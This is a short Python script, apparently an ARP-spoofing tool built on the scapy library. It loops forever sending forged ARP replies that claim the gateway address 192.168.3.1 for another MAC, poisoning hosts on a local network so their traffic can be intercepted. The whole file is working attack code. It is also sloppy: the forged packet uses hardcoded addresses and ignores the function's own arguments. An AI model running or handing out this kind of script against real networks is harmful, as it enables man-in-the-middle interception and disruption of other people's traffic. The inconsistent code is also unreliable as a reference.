import time

from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, send


def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return (ans[0][1].src)
    else:
        return None


def spoof(target_ip,host_ip,verbose=True):

    target_mac = get_mac(target_ip)
    print(target_mac)

    arp_resposnse = ARP(pdst="192.168.3.51",hwdst="00:0c:29:14:73:aa",psrc="192.168.3.1",hwsrc="00:0c:29:14:73:ce",op="is-at",)

    send(arp_resposnse,verbose=0)
    if verbose:
        self_mac=ARP().hwsrc
        print(self_mac)

while True:
    spoof(target_ip="192.168.3.56",host_ip="192.168.3.64")
    spoof(target_ip="192.168.3.64", host_ip="192.168.3.56")
    time.sleep(0.1)